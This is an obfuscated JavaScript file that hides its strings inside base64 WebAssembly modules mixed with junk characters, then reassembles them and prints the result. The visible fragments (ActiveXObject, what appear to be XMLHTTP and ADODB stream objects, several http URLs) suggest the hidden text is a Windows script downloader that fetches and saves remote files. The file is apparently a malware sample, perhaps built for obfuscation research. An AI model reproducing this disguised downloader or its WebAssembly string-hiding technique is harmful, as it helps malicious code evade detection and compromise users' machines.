const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGpICAgAAGfwBBAQt/AEGkBwt/AEGmDwt/AEHcFgt/AEHeFgt/AEHgFgsHuoCAgAAHBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFC4GXgIAABgBBAQuhB2Zzb3VtZW5jc2NsYnRrZ2lhZm93aW5kbSUyMGVuZGhmbG53KGxnZnNhcmJ4JTJDeGIlMjBjY2Z1cG5iYyUyQ3JyJTIweHRyZnhuYmwpcWslN0JvYSUyMHJ0JTIwdnV2bmFhdnFyeXclMjBid3djaXNtaSUyMHRhJTNEb2olMjBjYW5ndmV3eHdhYyUyMGh2QXd5Y2JqdGZ1aWtvdmNrZWJiWHllT2Z5YnN5anB1ZXhhY2tzdGxoKGxoJTIydmNXdnFTYWdjaWlybmRpZW1wZ290YXEuc3dTZXlodnhlaHlsZGJscHUlMjJuZCl3YiUzQm5tJTIwZnYlMjBjeXZtcmFydnJ1dCUyMGhiZnhwbml5JTIwYWglM0R2aCUyMHdud2Ztc3JnLm1pRWRmeGNmcG5qYWF6bm1rZHN5RWhrbmV5dnF4aXZqcnNib3JhbmlrbWVnZXBjbml4dGlzU29qdHJpcnZraWpubnFrZ3Frc3lmKGZwJTIyZmUlMjVpZVRsZEVxc01ia1BraSUyNWF3JTIyanApd3clMjBzcSUyQm5mJTIwZHpTa2d0eHZycHdpc3JubWpndXIuYnFmdmpydHlvY3htcWZDaHdoYnRhcGhyYmpDdXdvY21kYXBlY3coYmQ5cHkyZG4pbm0lMjB4ayUyQmp3JTIwcndmYnhuY20lM0JkeiUyMGpqJTIwbXl2aGNhcWJyYXQlMjBuaHhoeW9wdyUyMGp1JTNEeHMlMjB3dm52ZGVjZndreiUyMHRtQWJwY2F1dHV3aXJydmFiZXhoWHViT2tkYm1lamxrZWRpY3NxdGZ1KGt5JTIycWxNaHhTeHBYb3BNemRMeXIyaWsucWVYeWVNa3NMZ3dIa2tUZ2lUa3VQa3YlMjJwYSlzaCUzQnNxJTIwcHolMjB6dXhhdm9jYS5tY29obG55c3JncmV3eWFndGRncnl6aXNuZ3RybWFybXRhdWVkdGNnaWh5d2FjdG5uZmd1Y2V3cCUyMHp6JTNEa2slMjB6bmZka3VsZ25tYWNwaXRuYmllaG9wd25raCUyMHRoKHp3KWxyJTdCZGQlMjBxdyUyMHByJTIwdWYlMjBvcWl3bmZ0byUyMGplKGtueGZhb2ZlLnhqcmxwZWxjYXRpZGZueWtuU2dudGN0YWFrdGFkZW1hJTIwemYlM0RicyUzRGNkJTNEdWolMjBkbDRjZylpZyU3QnpoJTIwa2UlMjB4dCUyMG4AAEGkBwuBCGglMjB1biUyMGxmJTIwZXl2anphendyYmclMjBycXhyY2FnYiUyMHliJTNEZW4lMjBkaW5rdmV4a3dsaiUyMG5sQWV5Y3JhdGV4aXBndmljZXpyWGR4T2NsYnBkanFjZWRkY3V0dHN0KGhhJTIydmlBa3pEbHNPdWdEYmZCcncub3NTdm10bW9ya2RldXBhZW1teWQlMjJpbyl4YiUzQm9hJTIwZHIlMjBkdyUyMHB2JTIwdHUlMjB1eCUyMHF3eHJzYW5xLnNwb3BmcHhsZXBnbnFuKHN0KXlzJTNCc2olMjBoayUyMHRlJTIwcWolMjBxdCUyMGx6JTIwbWZ4cmJhY2UudmF0cnJ5dnFwd2plZmglMjB6aCUzRHd1JTIwc2MxaW0lM0JndiUyMG5nJTIwamIlMjB5ayUyMGZ6JTIwb3YlMjBvY3h1dWFwbi5yZndid3Jxa2lkZ3RyZmVwZShneXhxdm9obi56dVJpZmV1Y3NoeXB3am9xeW5rdHNrZWVjdEJ6eG9lb2RqenlqcilhdSUzQnhnJTIweWUlMjBsdyUyMHBrJTIwaHAlMjB4ayUyMGNieGptYWNpLnptcGFhb2V1c2NmaXhldGFuaXNhb2Fhbm1lJTIwdWglM0RzeiUyMHBsMGtoJTNCZWMlMjB6ayUyMHFoJTIwbGYlMjB2ciUyMGdhJTIwd2h4aXNhbnQuZ3FzYWVhd292YmRlc3lUdnNvdG5GY25pbHJsY3FldWgobXJmZXJubnMlMkNxcSUyMHhqMnFwKXdzJTNCZGklMjBkaSUyMHBnJTIweWklMjBhZCUyMHloJTIwdWl4a2phenQuYWJjenJsYm5vdnlzZWlleXkocXApaG0lM0JkeCUyMGp5JTIweGklMjBkYyUyMHFtJTdEYWolMjBwbCUyMGJvJTIwbHYlMjByYiUzQmxzJTIwd3ElMjBpciU3RGNyJTIwZ3clMjBpYSUzQnp2JTIwenolMjB0cnRjbXJmYXlkdSUyMHF4JTdCYXUlMjB0eSUyMGd1JTIwdGclMjB2cnhpa29kdC50bm9meHBzZWVtbG5sbCh6ZiUyMnJ5R2NvRXB0VHdqJTIyeG0lMkNzeCUyMHhmZnBjcmZuJTJDYmYlMjBkb2Z6ZWFpd2x3Z3Nib2VzaSl6ZiUzQnl0JTIwa3klMjBvaSUyMHpqJTIwYWx4eG5vaHguemFzdmNlanlucXZkdnkoZGwpbmIlM0JpdiUyMGZ4JTIwcmclMjBjbyUyMGVxaXdwZmZoJTIwdmUodmJycXdubWglMjBucyUzRWR2JTIwZWowaGEpd3glN0J2ciUyMGh5JTIwaGUlMjBxbiUyMHBqJTIwcmclMjAAAEGmDwu1B2hvd3Bnc2hxLmRjUmF4dW53bm9mKGtmZmh5bmJlJTJDZXglMjBmaTB0bCUyQ2N2JTIweWwwamcpZ2UlM0JnciUyMG9vJTIwbnMlMjBsdyUyMGprJTdEdnolMjBuayUyMGVnJTIwZXUlMjBsbiUzQmJkJTIwY2QlMjBrbyU3RGV4JTIweHElMjBiZWN1bWF0dnR1cmN0ZmhkaCUyMHpkKG16ZXh5cmR1KW9uJTdCdGglMjBpZCUyMHBxJTdEZ3MlMjBpayUyMHRvJTNCZnIlN0R2bmR5YWx4eSh0cCUyMnpxaGp5dG9hdHpkcG93JTNBaXYlMkZsbyUyRnFjYmZ5aXBvZ2lpYm1mYXRvZ3l0dHlhcmdnZXhvdmNnZWJscnN4LmtwY3V0b2tpbW95JTJGYm5pdWJtdGxncWUlMkZvenN2d2N3bnJxZ2lydnBzeXRsaC5oYXBkc2hjYnBnbiUzRmtlaXRtYnZ5ZGN5MXJtLmZ1anBpcHFqZ3dyJTIyaGwlMkNlYSUyMHJtJTIydG4xdGYyaXM3emI0YnQ5aXUwdGY1aHYub2RldXp4Z2ZlaG8lMjJ6bCUyQ3ZtJTIwb20xdmEpY2olM0JnYmRrdGxweShxcyUyMnVuaG92dGljdGpmcGZuJTNBdGwlMkZ2ZSUyRnpwYmZ3aXVoZ3Z6YmlxYXFpZ2lldGJncmJiZWRwdmZ2ZWhzcmFxLm5sY2Rhb2dkbXdkJTJGbnFpd21tc2hna2clMkZ3eHNlemNreHJqdWlpYnB0ZnRjcy5ubHBydGhrYXBvbSUzRnFhaXF1YndiZG16MmpnLnp4andkcHF5Z293JTIybHclMkNleiUyMHVjJTIyeXE0dGsyb2o3c2YzZ2gycmgwc2E1Y2IuZnBlemh4bHJldGklMjJxaSUyQ2piJTIwbWQxanYpZmUlM0JybWRvY2x0aCh0eSUyMm9maGxpdHBtdHlqcHZhJTNBeHAlMkZzZCUyRm9lYmZyaXFxZ3Z6YmpkYW14Z2xmdHJ1cmN6ZWltdmJhZXpocm5tLm9kY2Z4b29obWpqJTJGeXBpc25tZG1na2wlMkZkc3NmcmNscXJqaml6Y3BvY3RnbS56enBlcGhsb3BodiUzRmJ6aW55YnF1ZGlqM2ljLnN3anducGN2Z21kJTIybmQlMkN4byUyMGpiJTIyaXYycm0zbnA1eHM0cXk4enE2a2s5a3AuY2VlZGt4anRlcWwlMjJtaCUyQ3huJTIwZGoxa3opb2MlM0JicwAAQdwWCwEAAEHeFgsBAABB4BYLAQA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var bajg = lS(0, 0);
var iilcf = lS(0, 1);
var ttilj = lS(0, 2);
var kleporgvg = bajg + iilcf + ttilj;
var anevekglax = lS(0, 3);
var doukfnmwc = 3;
var dknbblrpca = kleporgvg.split(lS(0, 4));
var bioyunasj = lS(0, 5);
(() => {
    i = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return i < dknbblrpca.length ? 1 : 0;
            },
            update: () => {
                i += doukfnmwc;
            },
            body: () => {
                {
                    anevekglax = anevekglax + dknbblrpca[i];
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                print(anevekglax);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();